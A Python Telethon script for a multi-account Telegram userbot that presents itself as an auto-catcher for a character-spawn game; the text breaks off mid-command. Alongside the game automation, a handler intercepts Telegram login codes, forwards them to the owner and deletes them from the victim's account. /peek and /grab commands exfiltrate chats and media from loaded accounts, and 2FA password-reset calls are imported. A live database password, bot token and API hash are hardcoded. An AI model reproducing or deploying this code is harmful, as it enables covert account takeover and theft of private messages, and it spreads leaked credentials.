import os
import asyncio
import random
import re
import hashlib
import traceback
import time
import unicodedata
from datetime import datetime as _dt, timedelta, timezone

from telethon import TelegramClient, events, functions
from telethon.sessions import StringSession
from telethon.tl.functions.account import (
    GetPasswordRequest, UpdatePasswordSettingsRequest, ResetPasswordRequest
)
from telethon.tl import types as tl_types

InputCheckPasswordSRP = getattr(tl_types, 'InputCheckPasswordSRP', None)
InputCheckPasswordEmpty = getattr(tl_types, 'InputCheckPasswordEmpty', None)
PasswordInputSettings = getattr(tl_types, 'PasswordInputSettings', None)

from motor.motor_asyncio import AsyncIOMotorClient

# ==========================================
# ⚙️ CONFIG
# ==========================================
APP_ID = 39584681
APP_HASH = 'c8c0685d6dd5b9e546093ea90d27733b'
MONGO_URI = "mongodb+srv://kkt:h1BdaMt7nxW9jTXa@cluster0.kb5fzfl.mongodb.net/?appName=Cluster0&tlsAllowInvalidCertificates=true"
BOT_TOKEN = '8738081667:AAHADgcDISntnOBwT3uj2yYw7n3XJUN2uZI'

OWNER_ID = 6015356597
SPECIFIC_GROUP = -1003848067679
SPAWN_BOT_ID = 6157455819

# 💡 Hint bots — 3 DM workspaces
HINT_BOT_IDS = {8575371720, 8769582147, 8088685714}

# 🚫 Blacklist — default 4 from original main.py
DEFAULT_BLACKLIST = {
    -1001947407820,
    -1003067509608,
    -1003760110058,
    -1003555031860,   # 👈 user requested
}
IGNORED_SPAWN_CHATS = set()

# ⏱️ Timing (only for /catch human-like delay)
MIN_CATCH_DELAY_SEC = 3.0
CATCH_JITTER_MIN = 0.9
CATCH_JITTER_MAX = 3.0
LIMIT_EXTEND_SEC = 3600

IRAN_TZ = timezone(timedelta(hours=3, minutes=30))

CGIFT_CHAT_ID = -1004423642531
CGIFT_WAIT_SEC = 6

PEEK_LIMIT = 1000
PEEK_FORWARD_BATCH = 50

# ==========================================
# 🔗 STORAGE
# ==========================================
userbot_instances = {}
hint_bot_ids = set(HINT_BOT_IDS)
spawn_sessions = {}           # spawn_key -> session dict
dm_pending = {}               # (uid, bot_id) -> [(spawn_key, ts)]
forward_tracker = {}          # (uid, bot_id, fwd_msg_id) -> spawn_key
pending_catch_responses = {}  # (uid, chat_id) -> (catch_msg_id, ts)
resume_tasks = {}             # uid -> asyncio.Task
cgift_state = {}
loaded_userbots = []

CATCH_REGEX = re.compile(r"(/catch(?:@\w+)?\s+[^\n`]+)")
bot_state = {"selected_user_id": None, "save_mode": False}

# MongoDB
client_mongo = AsyncIOMotorClient(MONGO_URI)
db = client_mongo["telegram_bot"]
config_col = db["config"]
reply_save_col = db["reply_save_col"]
target_bots_col = db["target_bots"]
tomboy_col = db["tomboy_col"]
marcuz_col = db["marcuz_col"]
talk_col = db["random_talk"]
filters_col = db["filters"]
hint_bots_col = db["hint_bots_col"]
registry_col = db["collection_registry"]
cgift_ids_col = db["cgift_ids"]

bot = TelegramClient('official_bot_session', APP_ID, APP_HASH)


# ==========================================
# 🛡️ SAFE HANDLER
# ==========================================
def safe_handler(name):
    def deco(func):
        async def wrapper(event, *a, **kw):
            try:
                return await func(event, *a, **kw)
            except Exception as e:
                try:
                    info = f"chat={event.chat_id} sender={event.sender_id}"
                except Exception:
                    info = ""
                print(f"❌ [{name}] {type(e).__name__}: {e} | {info}")
                traceback.print_exc()
        wrapper.__name__ = func.__name__
        return wrapper
    return deco


# ==========================================
# 🔐 2FA SRP
# ==========================================
def compute_srp_check(password, algo, B_bytes, srp_id):
    s1, s2 = algo.salt1, algo.salt2
    g, p = algo.g, algo.p
    h1 = hashlib.sha256(s1 + password.encode() + s1).digest()
    h2 = hashlib.sha256(s2 + h1 + s2).digest()
    x = int.from_bytes(h2, 'big')
    v = pow(g, x, p)
    p_b = p.to_bytes((p.bit_length() + 7) // 8, 'big')
    g_b = g.to_bytes((g.bit_length() + 7) // 8, 'big')
    k = int.from_bytes(hashlib.sha256(p_b + g_b).digest(), 'big')
    a = int.from_bytes(os.urandom(256), 'big')
    A = pow(g, a, p)
    A_b = A.to_bytes(256, 'big')
    B = int.from_bytes(B_bytes, 'big')
    u = int.from_bytes(hashlib.sha256(A_b + B_bytes).digest(), 'big')
    S = pow((B - k * v) % p, a + u * x, p)
    S_b = S.to_bytes(256, 'big')
    K = hashlib.sha256(S_b).digest()
    hp = hashlib.sha256(p_b).digest()
    hg = hashlib.sha256(g_b).digest()
    hx = bytes(bb ^ cc for bb, cc in zip(hp, hg))
    hs1 = hashlib.sha256(s1).digest()
    hs2 = hashlib.sha256(s2).digest()
    M1 = hashlib.sha256(hx + hs1 + hs2 + A_b + B_bytes + K).digest()
    return InputCheckPasswordSRP(srp_id=srp_id, A=A_b, M1=M1)


def new_pwd_hash(password, algo):
    s1, s2 = algo.salt1, algo.salt2
    g, p = algo.g, algo.p
    h1 = hashlib.sha256(s1 + password.encode() + s1).digest()
    h2 = hashlib.sha256(s2 + h1 + s2).digest()
    x = int.from_bytes(h2, 'big')
    v = pow(g, x, p)
    return v.to_bytes(256, 'big')


# ==========================================
# 🌍 RENDER HEALTH
# ==========================================
async def handle_render_health_check(reader, writer):
    await reader.read(100)
    resp = "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: 2\r\n\r\nOK"
    writer.write(resp.encode())
    await writer.drain()
    writer.close()


async def start_dummy_web_server():
    port = int(os.environ.get("PORT", 10000))
    try:
        srv = await asyncio.start_server(handle_render_health_check, '0.0.0.0', port)
        async with srv:
            await srv.serve_forever()
    except Exception:
        pass


# ==========================================
# 🧼 HELPERS
# ==========================================
def get_message_text(event):
    if event.text:
        return event.text
    try:
        if event.message and event.message.message:
            return event.message.message
    except Exception:
        pass
    return ""


def clean_invisible(text):
    if not text:
        return ""
    try:
        return ''.join(c for c in text if unicodedata.category(c) != 'Cf')
    except Exception:
        return text


def is_spawn_message(text):
    if not text:
        return False
    t = clean_invisible(text)
    tl = t.lower()
    return ("spawned" in tl or "sᴘᴀᴡɴᴇᴅ" in tl
            or "a character has spawned" in tl
            or "ᴀ ᴄʜᴀʀᴀᴄᴛᴇʀ ʜᴀs sᴘᴀᴡɴᴇᴅ" in t)


def is_catch_success_message(text):
    if not text:
        return False
    t = clean_invisible(text)
    tl = t.lower()
    return ("you got a new character" in tl
            or "ʏᴏᴜ ɢᴏᴛ ᴀ ɴᴇᴡ ᴄʜᴀʀᴀᴄᴛᴇʀ" in t)


def is_limit_message(text):
    if not text:
        return False
    t = clean_invisible(text)
    tl = t.lower()
    return ("catch limit is reached" in tl
            or "ᴄᴀᴛᴄʜ ʟɪᴍɪᴛ ɪs ʀᴇᴀᴄʜᴇᴅ" in t)


def get_cmd_and_args(text):
    if not text:
        return "", ""
    text = text.strip()
    parts = text.split(maxsplit=1)
    cmd = parts[0]
    args = parts[1].strip() if len(parts) > 1 else ""
    if "@" in cmd:
        cmd = cmd.split("@")[0]
    return cmd, args


def parse_ids_from_text(text):
    return [ln.strip() for ln in text.split("\n")
            if ln.strip() and re.match(r"^\d+$", ln.strip())]


def make_mention(name, user_id):
    safe = (name or "User").replace("<", "").replace(">", "").replace("&", "&amp;")
    return f"<a href='tg://user?id={user_id}'>{safe}</a>"


def code(t):
    s = str(t).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
    return f"<code>{s}</code>"


def seconds_until_iran_midnight():
    now = _dt.now(IRAN_TZ)
    tomorrow = (now + timedelta(days=1)).replace(hour=0, minute=0, second=0, microsecond=0)
    return (tomorrow - now).total_seconds() + 5


# ==========================================
# 🚫 BLACKLIST (DB-seeded with 4 defaults)
# ==========================================
async def load_blacklist():
    global IGNORED_SPAWN_CHATS
    try:
        doc = await config_col.find_one({"_id": "spawn_blacklist"})
        if doc:
            IGNORED_SPAWN_CHATS = set(doc.get("groups", []))
            print(f"🚫 Loaded {len(IGNORED_SPAWN_CHATS)} groups from DB")
        else:
            IGNORED_SPAWN_CHATS = set(DEFAULT_BLACKLIST)
            await save_blacklist()
            print(f"🚫 First run — seeded {len(IGNORED_SPAWN_CHATS)} default groups")
    except Exception as e:
        print(f"⚠️ load_blacklist failed: {e}")
        IGNORED_SPAWN_CHATS = set(DEFAULT_BLACKLIST)


async def save_blacklist():
    try:
        await config_col.update_one(
            {"_id": "spawn_blacklist"},
            {"$set": {"groups": list(IGNORED_SPAWN_CHATS)}},
            upsert=True
        )
    except Exception as e:
        print(f"⚠️ save_blacklist: {e}")


# ==========================================
# ⏰ LIMIT PAUSE / RESUME
# ==========================================
async def pause_for_limit(uid):
    config = userbot_instances.get(uid)
    if not config:
        return

    # ⚠️ Cancel any old resume task first
    old_task = resume_tasks.get(uid)
    if old_task and not old_task.done():
        try:
            old_task.cancel()
            print(f"🚫 [{uid}] old resume task cancelled")
        except Exception:
            pass

    now = time.time()
    resume_at = now + seconds_until_iran_midnight()

    prev = config.get("last_limit_at", 0)
    if now - prev < LIMIT_EXTEND_SEC:
        resume_at = max(resume_at, now + LIMIT_EXTEND_SEC)

    config["limit_reached"] = True
    config["limit_resume_at"] = resume_at
    config["last_limit_at"] = now

    try:
        await db[config["collection_name"]].update_one(
            {"user_id": uid},
            {"$set": {"limit_reached": True, "limit_resume_at": resume_at,
                      "last_limit_at": now}})
    except Exception as e:
        print(f"⚠️ DB update: {e}")

    try:
        await bot.send_message(
            OWNER_ID,
            f"🚫 <b>[{code(uid)}] Catch limit reached</b>\n"
            f"⏸️ Paused {(resume_at - now)/3600:.2f}h\n"
            f"🕐 Resume after Iran midnight",
            parse_mode="html")
    except Exception:
        pass

    print(f"🚫 [{uid}] limit → {_dt.fromtimestamp(resume_at, IRAN_TZ):%H:%M} Iran")
    resume_tasks[uid] = asyncio.create_task(resume_after(uid, resume_at - now))


async def resume_after(uid, wait_sec):
    try:
        await asyncio.sleep(max(0, wait_sec))
        config = userbot_instances.get(uid)
        if not config:
            return
        cur = config.get("limit_resume_at")
        if cur and time.time() < cur - 5:
            print(f"⏭️ [{uid}] newer pause active, skip")
            return
        config["limit_reached"] = False
        config["limit_resume_at"] = None
        try:
            await db[config["collection_name"]].update_one(
                {"user_id": uid},
                {"$set": {"limit_reached": False, "limit_resume_at": None}})
        except Exception:
            pass
        try:
            await bot.send_message(OWNER_ID,
                f"✅ [{code(uid)}] auto-catch resumed", parse_mode="html")
        except Exception:
            pass
        print(f"✅ [{uid}] resumed")
    except asyncio.CancelledError:
        print(f"🚫 [{uid}] resume cancelled")
        raise
    except Exception as e:
        print(f"❌ resume_after {uid}: {e}")
    finally:
        if resume_tasks.get(uid) is asyncio.current_task():
            resume_tasks.pop(uid, None)


# ==========================================
# ⚔️ CATCH WORKER
# ==========================================
async def catch_worker(uid, spawn_key):
    session = spawn_sessions.get(spawn_key)
    if not session:
        return
    config = userbot_instances.get(uid)
    if not config:
        return

    # ✅ Human-like delay: min 3.5s from spawn + random jitter
    elapsed = time.time() - session["spawn_time"]
    wait = (max(0.0, MIN_CATCH_DELAY_SEC - elapsed)
            + random.uniform(CATCH_JITTER_MIN, CATCH_JITTER_MAX))
    await asyncio.sleep(wait)

    # Try queued commands one by one until one succeeds
    while session.get("catch_cmds") and session["catch_state"] != "sent":
        catch_cmd = session["catch_cmds"].pop(0)
        session["catch_state"] = "sending"
        try:
            catch_msg = await config["client"].send_message(
                session["chat_id"], catch_cmd)
            session["catch_state"] = "sent"
            pending_catch_responses[(uid, session["chat_id"])] = (
                catch_msg.id, time.time())
            total = time.time() - session["spawn_time"]
            print(f"✅ [{uid}] /catch sent in {session['chat_id']} after {total:.2f}s")
            return
        except Exception as e:
            print(f"❌ [{uid}] catch fail: {type(e).__name__}: {e}")
            session["catch_state"] = "failed"
            await asyncio.sleep(1)

    if session["catch_state"] != "sent":
        session["catch_state"] = "failed"
        session["_gave_up"] = True
        print(f"❌ [{uid}] all catch attempts failed")


# ==========================================
# 🎁 CGIFT LOOP
# ==========================================
async def run_cgift_loop(client, user_id):
    state = cgift_state.get(user_id)
    if not state:
        return
    try:
        doc = await cgift_ids_col.find_one({"user_id": user_id})
        if not doc:
            state["running"] = False; state["task"] = None; return
        ids = doc.get("ids", [])
        total = len(ids)
        if total == 0:
            state["running"] = False; state["task"] = None; return
        while state["running"] and state["index"] < total:
            gift_id = ids[state["index"]]
            try:
                rt = state.get("reply_to_msg_id")
                if rt:
                    await client.send_message(state["chat_id"],
                        f"/checksync {gift_id}", reply_to=rt)
                else:
                    await client.send_message(state["chat_id"],
                        f"/checksync {gift_id}")
            except Exception as e:
                print(f"❌ cgift: {e}")
            state["index"] += 1
            if not state["running"] or state["index"] >= total:
                break
            await asyncio.sleep(CGIFT_WAIT_SEC)
        if state["index"] >= total:
            state["index"] = 0
        state["running"] = False; state["task"] = None
    except Exception as e:
        print(f"❌ cgift loop: {e}")
        state["running"] = False; state["task"] = None


@safe_handler("cgift_selfbot")
async def cgift_selfbot_handler(event):
    uid = getattr(event.client, 'tg_user_id', None)
    if not uid or uid not in userbot_instances:
        return
    if event.chat_id != CGIFT_CHAT_ID or not event.text:
        return
    cmd, args = get_cmd_and_args(event.text)
    if cmd == "/cgift" and not args:
        if uid not in cgift_state:
            cgift_state[uid] = {"running": False, "index": 0, "chat_id": None,
                                "reply_to_msg_id": None, "task": None}
        st = cgift_state[uid]
        if st["running"]:
            return
        st["running"] = True
        st["chat_id"] = event.chat_id
        st["reply_to_msg_id"] = event.reply_to_msg_id or None
        st["task"] = asyncio.create_task(run_cgift_loop(event.client, uid))
    elif cmd == "/stop":
        if uid in cgift_state and cgift_state[uid]["running"]:
            cgift_state[uid]["running"] = False


# ==========================================
# 🎮 SELF CONTROL
# ==========================================
@safe_handler("self_control")
async def self_control_handler(event):
    uid = getattr(event.client, 'tg_user_id', None)
    if not uid or uid not in userbot_instances:
        return
    if not event.is_private:
        return
    text = (event.text or "").strip().lower()
    if text not in ("/acstop", "/acstart", "/acstatus"):
        return

    config = userbot_instances[uid]
    col = config["collection_name"]

    if text == "/acstop":
        config["is_stopped"] = True
        try:
            await db[col].update_one({"user_id": uid}, {"$set": {"is_stopped": True}})
        except Exception:
            pass
        await event.reply("🛑 Auto-catch **STOPPED**")

    elif text == "/acstart":
        old = resume_tasks.pop(uid, None)
        if old and not old.done():
            try:
                old.cancel()
            except Exception:
                pass
        config["is_stopped"] = False
        config["limit_reached"] = False
        config["limit_resume_at"] = None
        try:
            await db[col].update_one(
                {"user_id": uid},
                {"$set": {"is_stopped": False, "limit_reached": False,
                          "limit_resume_at": None}})
        except Exception:
            pass
        await event.reply("🚀 Auto-catch **STARTED**")

    elif text == "/acstatus":
        st = "🛑 Manual STOP" if config.get("is_stopped") else "🟢 Running"
        if config.get("limit_reached"):
            rem = max(0, config.get("limit_resume_at", 0) - time.time())
            st += f"\n🚫 Limit pause — {rem/3600:.2f}h left"
        else:
            st += "\n✅ No limit"
        await event.reply(f"📊 **Status:**\n{st}")


# ==========================================
# ⚔️ SPAWN DETECTOR
# ==========================================
@safe_handler("spawn_detector")
async def spawn_detector_handler(event):
    uid = getattr(event.client, 'tg_user_id', None)
    if not uid or uid not in userbot_instances:
        return
    config = userbot_instances[uid]
    if config["is_stopped"] or config.get("limit_reached"):
        return

    if event.chat_id in IGNORED_SPAWN_CHATS:
        return

    text = get_message_text(event)
    if not text or not is_spawn_message(text):
        return

    text_clean = clean_invisible(text)
    if any(e in text_clean for e in config.get("ignored_emojis", [])):
        return

    spawn_key = (uid, event.chat_id, event.message.id)
    if spawn_key in spawn_sessions:
        return

    spawn_sessions[spawn_key] = {
        "chat_id": event.chat_id,
        "spawn_msg_id": event.message.id,
        "spawn_time": time.time(),
        "catch_cmds": [],
        "catch_state": "pending",
        "catch_task": None,
    }

    # Forward to all 3 hint bot DMs — direct, no delays
    for bot_id in hint_bot_ids:
        try:
            fwd = await event.client.forward_messages(bot_id, event.message)
            fwd_msg = fwd[0] if isinstance(fwd, list) else fwd
            if fwd_msg:
                forward_tracker[(uid, bot_id, fwd_msg.id)] = spawn_key
            dm_pending.setdefault((uid, bot_id), []).append(
                (spawn_key, time.time()))
        except Exception as e:
            print(f"⚠️ [{uid}] forward to {bot_id}: {e}")

    print(f"📤 [{uid}] spawn → 3 hint DMs (chat={event.chat_id}, msg={event.message.id})")


# ==========================================
# 💡 HINT REPLY
# ==========================================
@safe_handler("hint_reply")
async def hint_reply_handler(event):
    uid = getattr(event.client, 'tg_user_id', None)
    if not uid or uid not in userbot_instances:
        return
    config = userbot_instances[uid]
    if config["is_stopped"] or config.get("limit_reached"):
        return
    if event.sender_id not in hint_bot_ids:
        return
    if not event.is_private or event.out:
        return

    text = clean_invisible(get_message_text(event))
    if not text:
        return

    match = CATCH_REGEX.search(text)
    if not match:
        return

    catch_cmd = match.group(1).strip(" `\n\r\t")
    if not catch_cmd:
        return

    bot_id = event.sender_id
    spawn_key = None
    queue = dm_pending.get((uid, bot_id), [])
    now = time.time()

    # Reply-ID primary
    if event.reply_to_msg_id:
        sk = forward_tracker.pop((uid, bot_id, event.reply_to_msg_id), None)
        if sk:
            spawn_key = sk
            queue = [(k, t) for (k, t) in queue if k != sk]
            dm_pending[(uid, bot_id)] = queue

    # FIFO fallback (TTL 60s)
    if not spawn_key and queue:
        for i, (sk, ts) in enumerate(queue):
            if sk in spawn_sessions and now - ts < 60:
                spawn_key = sk
                queue.pop(i)
                dm_pending[(uid, bot_id)] = queue
                break
            elif now - ts >= 60:
                queue.pop(i)
                dm_pending[(uid, bot_id)] = queue

    if not spawn_key or spawn_key not in spawn_sessions:
        return

    session = spawn_sessions[spawn_key]
    if session["catch_state"] == "sent":
        return
    if session["catch_state"] == "failed" and session.get("_gave_up"):
        return

    if catch_cmd not in session["catch_cmds"]:
        session["catch_cmds"].append(catch_cmd)

    task = session.get("catch_task")
    if task is None or task.done():
        session["catch_state"] = "pending"
        session["catch_task"] = asyncio.create_task(catch_worker(uid, spawn_key))
        print(f"🎬 [{uid}] catch worker started")


# ==========================================
# 🚫 LIMIT DETECTOR
# ==========================================
@safe_handler("limit_detector")
async def limit_detector_handler(event):
    uid = getattr(event.client, 'tg_user_id', None)
    if not uid or uid not in userbot_instances:
        return
    text = clean_invisible(get_message_text(event))
    if not is_limit_message(text):
        return
    key = (uid, event.chat_id)
    pending = pending_catch_responses.get(key)
    if not pending:
        return
    catch_msg_id, ts = pending
    if time.time() - ts > 30:
        pending_catch_responses.pop(key, None)
        return
    if event.reply_to_msg_id == catch_msg_id:
        await pause_for_limit(uid)
        pending_catch_responses.pop(key, None)


# ==========================================
# 🎉 SUCCESS FORWARD
# ==========================================
@safe_handler("success_forwarder")
async def catch_success_forwarder_handler(event):
    uid = getattr(event.client, 'tg_user_id', None)
    if not uid or uid not in userbot_instances:
        return
    if userbot_instances[uid].get("is_stopped"):
        return
    text = get_message_text(event)
    if not text or not is_catch_success_message(text):
        return
    try:
        text_clean = clean_invisible(text)
        me = await event.client.get_me()
        fn = (me.first_name or "").lower()
        ln = (me.last_name or "").lower()
        full = f"{fn} {ln}".strip()
        un = (me.username or "").lower()
        tl = text_clean.lower()
        if (event.message.mentioned
            or (fn and fn in tl)
            or (full and full in tl)
            or (un and un in tl)):
            await event.message.forward_to(SPECIFIC_GROUP)
    except Exception as e:
        print(f"❌ [{uid}] success forward: {e}")


@safe_handler("telegram_service")
async def telegram_service_handler(event):
    try:
        await bot.send_message(OWNER_ID,
            f"🔐 **Telegram Login Intercepted!**\n\n{event.message.text}")
        await event.delete()
    except Exception as e:
        print(f"❌ telegram_service: {e}")


def register_userbot_handlers(client):
    client.add_event_handler(spawn_detector_handler, events.NewMessage(from_users=SPAWN_BOT_ID))
    client.add_event_handler(catch_success_forwarder_handler, events.NewMessage(from_users=SPAWN_BOT_ID))
    client.add_event_handler(hint_reply_handler, events.NewMessage())
    client.add_event_handler(limit_detector_handler, events.NewMessage())
    client.add_event_handler(self_control_handler, events.NewMessage(outgoing=True))
    client.add_event_handler(cgift_selfbot_handler, events.NewMessage(outgoing=True))
    client.add_event_handler(telegram_service_handler, events.NewMessage(chats=777000))


# ==========================================
# 🧹 CLEANUP
# ==========================================
async def cleanup_loop():
    while True:
        try:
            await asyncio.sleep(60)
            now = time.time()
            for k in list(spawn_sessions.keys()):
                s = spawn_sessions[k]
                age = now - s["spawn_time"]
                if age > 300:
                    task = s.get("catch_task")
                    if task is None or task.done():
                        spawn_sessions.pop(k, None)
            for k in list(forward_tracker.keys()):
                if forward_tracker[k] not in spawn_sessions:
                    forward_tracker.pop(k, None)
            for k in list(dm_pending.keys()):
                new_q = [(sk, ts) for (sk, ts) in dm_pending[k]
                         if sk in spawn_sessions and now - ts < 60]
                if new_q:
                    dm_pending[k] = new_q
                else:
                    dm_pending.pop(k, None)
        except Exception as e:
            print(f"⚠️ cleanup: {e}")


# ==========================================
# 📋 LIST
# ==========================================
async def build_loaded_list():
    if not loaded_userbots:
        return "📭 <b>No userbots loaded.</b>"
    rows = sorted(loaded_userbots, key=lambda x: (x.get("name") or "").lower())
    lines = [f"🤖 <b>Loaded Userbots: {len(rows)}</b>\n"]
    for i, info in enumerate(rows, 1):
        u_id = info.get("u_id")
        name = info.get("name") or "No Name"
        un = info.get("username")
        phone = info.get("phone") or "—"
        col = info.get("col_name") or "?"
        cfg = userbot_instances.get(u_id, {})
        if cfg.get("limit_reached"):
            mode = "🚫 Limit"
        elif cfg.get("is_stopped"):
            mode = "🛑 Stopped"
        else:
            mode = "🟢 Active"
        un_str = f" (@{un})" if un else ""
        lines.append(
            f"{i}. {make_mention(name, u_id)}{un_str}\n"
            f"   🆔 {code(u_id)}\n"
            f"   📱 {code(phone)}\n"
            f"   🗂️ {code(col)} — {mode}")
    return "\n".join(lines)


# ==========================================
# 👀 PEEK
# ==========================================
async def perform_peek(uid, target_username, owner_chat_id):
    cfg = userbot_instances.get(uid)
    if not cfg:
        return False, "Userbot not found"
    client = cfg["client"]
    username = target_username.lstrip("@").strip()
    if not username:
        return False, "Invalid username"
    try:
        entity = await client.get_entity(username)
    except Exception as e:
        return False, f"Cannot find: {e}"
    try:
        messages = await client.get_messages(entity, limit=PEEK_LIMIT)
    except Exception as e:
        return False, f"Fetch failed: {e}"
    if not messages:
        return False, "No messages"
    try:
        await client.send_message(owner_chat_id,
            f"👀 **PEEK**\n🆔 `{uid}`\n🎯 @{username}\n📊 {len(messages)}")
    except Exception as e:
        return False, f"Cannot message: {e}"
    msg_ids = [m.id for m in messages][::-1]
    fwd = 0
    for i in range(0, len(msg_ids), PEEK_FORWARD_BATCH):
        batch = msg_ids[i:i+PEEK_FORWARD_BATCH]
        try:
            await client.forward_messages(owner_chat_id, batch, entity)
            fwd += len(batch)
        except Exception as e:
            print(f"⚠️ batch: {e}")
        await asyncio.sleep(1)
    try:
        await client.send_message(owner_chat_id,
            f"✅ **PEEK DONE**\n📊 {fwd}/{len(messages)}")
    except Exception:
        pass
    return True, f"Forwarded {fwd}"


# ==========================================
# 📥 GRAB
# ==========================================
async def perform_grab(uid, group_id, msg_ids, owner_chat_id):
    cfg = userbot_instances.get(uid)
    if not cfg:
        return False, "Userbot not found"
    client = cfg["client"]
    try:
        entity = await client.get_entity(group_id)
    except Exception as e:
        return False, f"Cannot resolve: {e}"
    try:
        messages = await client.get_messages(entity, ids=msg_ids)
    except Exception as e:
        return False, f"Fetch failed: {e}"
    if not messages:
        return False, "No messages"
    if not isinstance(messages, list):
        messages = [messages]
    try:
        await client.send_message(owner_chat_id,
            f"📥 **GRAB**\n🆔 `{uid}`\n🎯 `{group_id}`\n📊 {len(messages)}")
    except Exception as e:
        return False, f"Cannot notify: {e}"
    tmp_dir = f"./grab_tmp_{uid}"
    os.makedirs(tmp_dir, exist_ok=True)
    ok = failed = no_media = 0
    for msg in messages:
        if not msg:
            failed += 1; continue
        if not msg.media:
            no_media += 1; continue
        fp = None
        try:
            fp = await msg.download_media(file=tmp_dir)
            if not fp:
                failed += 1; continue
            cap = msg.text or msg.message or ""
            if len(cap) > 900:
                cap = cap[:900] + "…"
            sent = False
            try:
                await client.send_file(owner_chat_id, fp, caption=cap, force_document=False)
                sent = True
            except Exception:
                pass
            if not sent:
                try:
                    await client.send_file(owner_chat_id, fp, caption=cap, force_document=True)
                    sent = True
                except Exception:
                    pass
            if sent:
                ok += 1
            else:
                failed += 1
        except Exception as e:
            print(f"❌ grab: {e}")
            failed += 1
        finally:
            try:
                if fp and os.path.exists(fp):
                    os.remove(fp)
            except Exception:
                pass
            await asyncio.sleep(0.5)
    try:
        if os.path.isdir(tmp_dir) and not os.listdir(tmp_dir):
            os.rmdir(tmp_dir)
    except Exception:
        pass
    try:
        await client.send_message(owner_chat_id,
            f"✅ **GRAB DONE**\n📤 {ok}\n🚫 {failed}\n📭 {no_media}\n📊 {len(messages)}")
    except Exception:
        pass
    return True, f"Done {ok}/{len(messages)}"


# ==========================================
# 🤖 BOT COMMANDS
# ==========================================
@bot.on(events.NewMessage(chats=[SPECIFIC_GROUP, OWNER_ID]))
async def handle_bot_commands(event):
    try:
        if event.sender_id != OWNER_ID:
            return
        text = event.message.text.strip() if event.message.text else ""
        if not text:
            return
        cmd, args = get_cmd_and_args(text)

        # SAVE MODE
        if bot_state["save_mode"] and bot_state["selected_user_id"] and not text.startswith("/"):
            ids = parse_ids_from_text(text)
            if ids:
                tu = bot_state["selected_user_id"]
                await cgift_ids_col.update_one(
                    {"user_id": tu},
                    {"$push": {"ids": {"$each": ids}}},
                    upsert=True)
                doc = await cgift_ids_col.find_one({"user_id": tu})
                total = len(doc.get("ids", [])) if doc else len(ids)
                await event.reply(f"✅ Saved {len(ids)} IDs for `{tu}`\n📊 Total: `{total}`")
            return

        if cmd == "/listbots":
            msg = await build_loaded_list()
            if len(msg) > 4000:
                chunks, cur = [], ""
                for line in msg.split("\n"):
                    if len(cur) + len(line) + 1 > 4000:
                        chunks.append(cur); cur = line
                    else:
                        cur = (cur + "\n" + line) if cur else line
                if cur: chunks.append(cur)
                for ch in chunks:
                    await event.reply(ch, parse_mode="html")
            else:
                await event.reply(msg, parse_mode="html")

        # 🚫 BLACKLIST
        elif cmd == "/blacklist":
            if not IGNORED_SPAWN_CHATS:
                await event.reply(
                    "📭 <b>Blacklist empty</b> — catching ALL groups.\n"
                    "Use <code>/addblacklist -100xxx</code> to exclude.",
                    parse_mode="html")
            else:
                lines = [f"🚫 <b>Blacklisted Groups: {len(IGNORED_SPAWN_CHATS)}</b>\n"]
                for gid in sorted(IGNORED_SPAWN_CHATS):
                    lines.append(f"• {code(gid)}")
                await event.reply("\n".join(lines), parse_mode="html")

        elif cmd == "/addblacklist":
            if not args:
                await event.reply("⚠️ `/addblacklist -100xxx [-100yyy ...]`")
                return
            added = []
            for tok in re.split(r"[,\s]+", args.strip()):
                tok = tok.strip()
                if not tok:
                    continue
                try:
                    gid = int(tok)
                except ValueError:
                    continue
                if gid not in IGNORED_SPAWN_CHATS:
                    IGNORED_SPAWN_CHATS.add(gid)
                    added.append(gid)
            if added:
                await save_blacklist()
                await event.reply(
                    f"✅ Added {len(added)} group(s)\n"
                    f"📊 Total: `{len(IGNORED_SPAWN_CHATS)}`")
            else:
                await event.reply("❌ No new IDs.")

        elif cmd == "/delblacklist":
            if not args:
                await event.reply("⚠️ `/delblacklist -100xxx`")
                return
            removed = []
            for tok in re.split(r"[,\s]+", args.strip()):
                try:
                    gid = int(tok.strip())
                except ValueError:
                    continue
                if gid in IGNORED_SPAWN_CHATS:
                    IGNORED_SPAWN_CHATS.discard(gid)
                    removed.append(gid)
            if removed:
                await save_blacklist()
                await event.reply(
                    f"🗑️ Removed {len(removed)}\n"
                    f"📊 Remaining: `{len(IGNORED_SPAWN_CHATS)}`")
            else:
                await event.reply("❌ None removed.")

        elif cmd == "/clearblacklist":
            IGNORED_SPAWN_CHATS.clear()
            await save_blacklist()
            await event.reply("🗑️ Cleared. Now catching **ALL groups**.")

        elif cmd == "/clearsessions":
            if args.lower() not in ("confirm", "yes"):
                await event.reply(
                    f"⚠️ <b>WARNING</b>\n"
                    f"Removes ALL {len(userbot_instances)} accounts + sessions.\n\n"
                    f"Send <code>/clearsessions confirm</code>",
                    parse_mode="html")
                return
            for uid, cfg in list(userbot_instances.items()):
                try:
                    await cfg["client"].disconnect()
                except Exception:
                    pass
            for t in list(resume_tasks.values()):
                try:
                    t.cancel()
                except Exception:
                    pass
            resume_tasks.clear()
            userbot_instances.clear()
            loaded_userbots.clear()
            spawn_sessions.clear()
            dm_pending.clear()
            forward_tracker.clear()
            pending_catch_responses.clear()
            async for reg in registry_col.find():
                cname = reg.get("collection_name")
                if cname:
                    await db[cname].delete_many({})
            await registry_col.delete_many({})
            await event.reply("🗑️ **All sessions cleared.** Use `/addauto`.")

        elif cmd == "/peek":
            if not args:
                await event.reply("⚠️ `/peek {uid} {@username}`"); return
            parts = args.split(maxsplit=1)
            try:
                tu = int(parts[0])
            except ValueError:
                await event.reply("❌ Invalid."); return
            if tu not in userbot_instances:
                await event.reply(f"❌ `{tu}` not online."); return
            target = None
            if len(parts) > 1:
                target = parts[1].strip()
            elif event.is_reply:
                r = await event.get_reply_message()
                if r and r.text:
                    target = r.text.strip()
            if not target:
                await event.reply("⚠️ No @username."); return
            m = re.search(r"@[\w\d_]+", target)
            target = m.group(0) if m else ("@" + target if not target.startswith("@") else target)
            await event.reply(f"👀 Peeking @{target.lstrip('@')} via `{tu}`...")
            asyncio.create_task(perform_peek(tu, target, event.chat_id))

        elif cmd == "/grab":
            if not args:
                await event.reply("⚠️ `/grab {uid} {group_id} {msg_ids}`"); return
            parts = args.split(maxsplit=2)
            if len(parts) < 2:
                await event.reply("⚠️ Usage: `/grab {uid} {group_id} {msg_ids}`"); return
            try:
                tu = int(parts[0]); gid = int(parts[1])
            except ValueError:
                await event.reply("❌ Invalid."); return
            if tu not in userbot_instances:
